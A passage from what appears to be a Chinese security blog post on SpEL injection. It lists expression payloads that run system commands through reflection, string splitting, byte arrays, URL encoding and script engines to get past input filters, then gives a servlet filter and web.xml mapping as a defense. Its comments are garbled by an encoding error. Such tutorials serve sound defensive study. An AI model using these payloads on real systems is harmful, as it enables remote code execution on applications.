function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token comment">// åå°„è°ƒç”¨+å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å¦‚javaconé¢˜ç›®ä¸­çš„æ­£åˆ™è¿‡æ»¤</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// åŒä¸Šï¼Œéœ€è¦æœ‰ä¸Šä¸‹æ–‡ç¯å¢ƒ</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart1</span><span class="token comment">// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// å½“æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤è¢«è¿‡æ»¤æˆ–è€…è¢«URLç¼–ç æ‰æ—¶ï¼Œå¯ä»¥é€šè¿‡Stringç±»åŠ¨æ€ç”Ÿæˆå­—ç¬¦ï¼ŒPart2</span><span class="token comment">// byteæ•°ç»„å†…å®¹çš„ç”Ÿæˆåé¢æœ‰è„šæœ¬</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// JavaScriptå¼•æ“é€šç”¨PoC</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"nashorn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"</span><span class="token operator">+</span><span class="token string">"ng.Run"</span><span class="token operator">+</span><span class="token string">"time.getRu"</span><span class="token operator">+</span><span class="token string">"ntime().ex"</span><span class="token operator">+</span><span class="token string">"ec(s);"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScriptå¼•æ“+åå°„è°ƒç”¨</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScriptå¼•æ“+URLç¼–ç </span><span class="token comment">// å…¶ä¸­URLç¼–ç å†…å®¹ä¸ºï¼š</span><span class="token comment">// ä¸åŠ æœ€åçš„getInputStream()ä¹Ÿè¡Œï¼Œå› ä¸ºå¼¹è®¡ç®—å™¨ä¸éœ€è¦å›æ˜¾</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLDecoder</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// é»‘åå•è¿‡æ»¤".getClass("ï¼Œå¯åˆ©ç”¨æ•°ç»„çš„æ–¹å¼ç»•è¿‡ï¼Œè¿˜æœªæµ‹è¯•æˆåŠŸ</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span class="token comment">// JDK9æ–°å¢çš„shellï¼Œè¿˜æœªæµ‹è¯•</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">SomeWhitelistedClassNotPartOfJDK</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"jdk.jshell.JShell"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Methods<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'whatever java code in one statement'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpELInjectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Regex pattern to detect potential SpEL injections</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SPEL_INJECTION_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"#\\&#123;[^&#125;]+\\&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Initialization code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span>            <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">HttpServletRequest</span> httpRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>            <span class="token comment">// Check query parameters</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in parameter: "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// Check headers</span>            <span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerNames <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeaderNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>headerNames<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> header <span class="token operator">=</span> headerNames<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> headerValue <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>headerValue<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in header: "</span> <span class="token operator">+</span> header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Continue with the filter chain</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Cleanup code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Method to check if a value contains potential SpEL injection patterns</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">SPEL_INJECTION_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.example.filters.SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" 